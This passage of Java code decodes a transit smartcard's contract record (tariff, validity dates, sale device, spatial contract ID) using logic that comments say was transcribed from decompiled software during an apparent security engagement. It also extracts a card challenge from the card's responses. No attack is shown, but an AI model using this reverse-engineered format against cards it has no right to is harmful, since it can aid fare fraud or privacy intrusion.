        boolean hasEndDate = (iA & 8) != 0;
        long validityEndRaw = 16383;

        if ((iA & 1) != 0) pos += 5;                 // ContractRestirctTimeCode
        if ((iA & 2) != 0) pos += 5;                 // ContractRestirctCode
        if ((iA & 4) != 0) pos += 6;                 // ContractRestirctDuration
        if (hasEndDate) { validityEndRaw = bitField(d, pos, 14); pos += 14; }
        long validityDuration = 0;
        if ((iA & 16) != 0) { validityDuration = bitField(d, pos, 8); pos += 8; }
        long periodJourneys = 0;
        if ((iA & 32) != 0) { periodJourneys = bitField(d, pos, 8); pos += 8; }
        long customerProfile = 0;
        if ((iA & 64) != 0) { customerProfile = bitField(d, pos, 6); pos += 6; }
        long passengersNumber = 0;
        if ((iA & 128) != 0) { passengersNumber = bitField(d, pos, 5); pos += 5; }

        // Walk the TLV extension-block region (tags 0-11 known, 12/13 reserved, 14 generic-skip)
        // just far enough to extract tag 9 (SpatialContractId -> Predefined/EttCode).
        long spatialContractId0 = 0;
        boolean gotSpatial = false;
        while (pos < 232) {
            int tag = (int) bitField(d, pos, 4);
            pos += 4;
            if (tag == 14) {
                int len = (int) bitField(d, pos, 6);
                pos += 6 + len + 12;
            } else if (tag == 0) {
                pos += 22;
            } else if (tag == 1) {
                pos += 18;
            } else if (tag == 2) {
                int n = (int) bitField(d, pos, 4);
                pos += 4;
                pos += 16 * n;
            } else if (tag == 3) {
                pos += 32;
            } else if (tag == 4 || tag == 5) {
                pos += 36;
            } else if (tag == 6) {
                pos += 16 + 28 + 11;
            } else if (tag == 7) {
                pos += 44;
            } else if (tag == 8) {
                int len1 = (int) bitField(d, pos, 6);
                pos += 6 + len1 + 12;
            } else if (tag == 9) {
                long v = bitField(d, pos, 14);
                pos += 14;
                if (!gotSpatial) { spatialContractId0 = v; gotSpatial = true; }
            } else if (tag == 10) {
                // Transcribed literally from the decompiled source, including its apparent
                // quirk of not advancing past the count field before the loop -- unverified
                // against real card data (never observed in this engagement's samples).
                pos += 4;
                int n = (int) bitField(d, pos, 4);
                for (int k = 0; k < n; k++) pos += 10;
            } else if (tag == 11) {
                pos += 10 + 3 + 8;
            }
            // tags 12/13: no payload, loop continues at next tag boundary
        }

        sb.append("ContractProvider            = ").append(provider).append("\n");
        sb.append("ContractTariffUsage         = ").append(tariffUsage).append("\n");
        sb.append("ContractTariffCounter       = ").append(tariffCounter).append("\n");
        sb.append("ContractTariff              = ").append(tariff).append("\n");
        sb.append("ContractSaleDevice (kiosk)  = ").append(saleDevice).append("\n");
        sb.append("ContractSaleNumberDaily     = ").append(saleNumberDaily).append("\n");
        sb.append("ContractJourneyInterchanges = ").append(journeyInterchanges).append("\n");
        sb.append("ContractValidityStartDate   = ").append(dateStr(validityStartRaw, true)).append("\n");
        // ContractSaleDate is used as-is, no (~x)&0x3FFF complement -- only the Validity
        // Start/End dates go through that step (verified in scratchpad/decode_full_verify.py).
        sb.append("ContractSaleDate            = ").append(dateStr(saleDateRaw, false)).append("\n");
        if (hasEndDate) {
            sb.append("ContractValidityEndDate     = ").append(dateStr(validityEndRaw, true)).append("\n");
        } else {
            sb.append("ContractValidityEndDate     = (not encoded on card -- resolved by HopOn from its product catalog)\n");
        }
        if (validityDuration != 0) sb.append("ContractValidityDuration    = ").append(validityDuration).append("\n");
        if (periodJourneys != 0) sb.append("ContractPeriodJourneys      = ").append(periodJourneys).append("\n");
        if (customerProfile != 0) sb.append("ContractCustomerProfile     = ").append(customerProfile).append("\n");
        if (passengersNumber != 0) sb.append("ContractPassengersNumber    = ").append(passengersNumber).append("\n");

        if (gotSpatial) {
            long predefined = spatialContractId0 & 2047;
            long ettCode = (spatialContractId0 >> 11) + tariff * 10;
            sb.append("Predefined (catalog product id) = ").append(predefined).append("\n");
            sb.append("EttCode                          = ").append(ettCode).append("\n");
        } else {
            sb.append("Predefined / EttCode: no SpatialContractId block found on this record\n");
        }

        return sb.toString();
    }

    // ---------------------------------------------------------------- misc

    private static byte[] hex(String s) {
        int len = s.length();
        byte[] out = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            out[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
        return out;
    }

    private static String toHex(byte[] b) {
        StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02X", x));
        return sb.toString();
    }

    private byte[] extractCardChallenge() {
        if (responses.size() > 1) {
            byte[] resp = responses.get(1);
            if (resp != null && resp.length > 10) {
                return Arrays.copyOfRange(resp, 2, 10);
            }
        }
        return new byte[8];
    }

    private static byte[] unhexlify(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4) +
                                   Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }
}
